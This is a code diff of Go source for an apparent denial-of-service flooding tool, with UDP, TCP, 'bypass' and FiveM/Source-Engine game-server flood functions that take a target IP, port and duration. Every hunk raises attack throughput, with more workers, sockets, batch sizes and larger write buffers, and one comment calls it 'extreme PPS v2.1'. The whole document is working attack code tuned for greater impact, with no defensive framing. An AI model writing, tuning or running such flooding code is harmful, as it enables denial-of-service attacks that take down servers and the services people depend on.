@@ -136,12 +136,13 @@ func AUdpFlood(IP, PORT string, SECONDS int, SIZE int) {
 	}
 
 	// Optimized concurrency settings
-	workers := runtime.NumCPU() * 4
-	if workers < 32 {
-		workers = 32
+	// Doubled workers and sockets
+	workers := runtime.NumCPU() * 8
+	if workers < 64 {
+		workers = 64
 	}
-	const socketsPerWorker = 16
-	const batch = 500
+	const socketsPerWorker = 32
+	const batch = 1000
 
 	type workerConns struct {
 		conns []*net.UDPConn
@@ -159,7 +160,7 @@ func AUdpFlood(IP, PORT string, SECONDS int, SIZE int) {
 				if err != nil {
 					continue
 				}
-				conn.SetWriteBuffer(16 * 1024 * 1024)
+				conn.SetWriteBuffer(64 * 1024 * 1024)
 				c = append(c, conn)
 			}
 			allConns[workerIdx].conns = c
@@ -264,12 +265,12 @@ func AUdpBypass(IP, PORT string, SECONDS int) {
 		return
 	}
 
-	workers := runtime.NumCPU() * 4
-	if workers < 32 {
-		workers = 32
+	workers := runtime.NumCPU() * 8
+	if workers < 64 {
+		workers = 64
 	}
-	const socketsPerWorker = 16
-	const batchSize = 250
+	const socketsPerWorker = 32
+	const batchSize = 500
 
 	type workerConns struct {
 		conns []*net.UDPConn
@@ -287,7 +288,7 @@ func AUdpBypass(IP, PORT string, SECONDS int) {
 				if err != nil {
 					continue
 				}
-				conn.SetWriteBuffer(16 * 1024 * 1024)
+				conn.SetWriteBuffer(64 * 1024 * 1024)
 				c = append(c, conn)
 			}
 			allConns[workerIdx].conns = c
@@ -384,12 +385,13 @@ func APpsBypass(IP, PORT string, SECONDS int) {
 		payloads[i] = p
 	}
 
-	workers := runtime.NumCPU() * 4
-	if workers < 32 {
-		workers = 32
+	// Doubled workers and sockets for extreme PPS v2.1
+	workers := runtime.NumCPU() * 16
+	if workers < 128 {
+		workers = 128
 	}
-	const socketsPerWorker = 32
-	const batch = 1000
+	const socketsPerWorker = 128
+	const batch = 5000
 
 	type workerConns struct {
 		conns []*net.UDPConn
@@ -407,7 +409,7 @@ func APpsBypass(IP, PORT string, SECONDS int) {
 				if err != nil {
 					continue
 				}
-				conn.SetWriteBuffer(32 * 1024 * 1024)
+				conn.SetWriteBuffer(64 * 1024 * 1024)
 				c = append(c, conn)
 			}
 			allConns[workerIdx].conns = c
@@ -509,12 +511,13 @@ func AGbpBypass(IP, PORT string, SECONDS int) {
 		payloads[i] = p
 	}
 
-	workers := runtime.NumCPU() * 4
-	if workers < 32 {
-		workers = 32
+	// Doubled workers and sockets
+	workers := runtime.NumCPU() * 8
+	if workers < 64 {
+		workers = 64
 	}
-	const socketsPerWorker = 16 // Balanced for throughput vs PPS
-	const batch = 250
+	const socketsPerWorker = 32
+	const batch = 500
 
 	type workerConns struct {
 		conns []*net.UDPConn
@@ -532,7 +535,7 @@ func AGbpBypass(IP, PORT string, SECONDS int) {
 				if err != nil {
 					continue
 				}
-				conn.SetWriteBuffer(32 * 1024 * 1024)
+				conn.SetWriteBuffer(64 * 1024 * 1024)
 				c = append(c, conn)
 			}
 			allConns[workerIdx].conns = c
@@ -617,9 +620,10 @@ func ATcpFlood(IP, PORT string, SECONDS int) {
 	payload := make([]byte, 1024)
 	rand.Read(payload)
 
-	workers := runtime.NumCPU() * 2
-	if workers < 16 {
-		workers = 16
+	// Tripled workers for high TCP parallelism
+	workers := runtime.NumCPU() * 12
+	if workers < 64 {
+		workers = 64
 	}
 
 	var wg sync.WaitGroup
@@ -690,12 +694,12 @@ func AFivemFlood(IP, PORT string, SECONDS int) {
 		[]byte("\xff\xff\xff\xffTSource Engine Query\x00"),
 	}
 
-	workers := runtime.NumCPU() * 4
-	if workers < 32 {
-		workers = 32
+	workers := runtime.NumCPU() * 8
+	if workers < 64 {
+		workers = 64
 	}
-	const socketsPerWorker = 16
-	const batchSize = 250
+	const socketsPerWorker = 32
+	const batchSize = 500
 
 	type workerConns struct {
 		conns []*net.UDPConn
@@ -713,7 +717,7 @@ func AFivemFlood(IP, PORT string, SECONDS int) {
 				if err != nil {
 					continue
 				}
-				conn.SetWriteBuffer(16 * 1024 * 1024)
+				conn.SetWriteBuffer(64 * 1024 * 1024)
 				c = append(c, conn)
 			}
 			allConns[workerIdx].conns = c
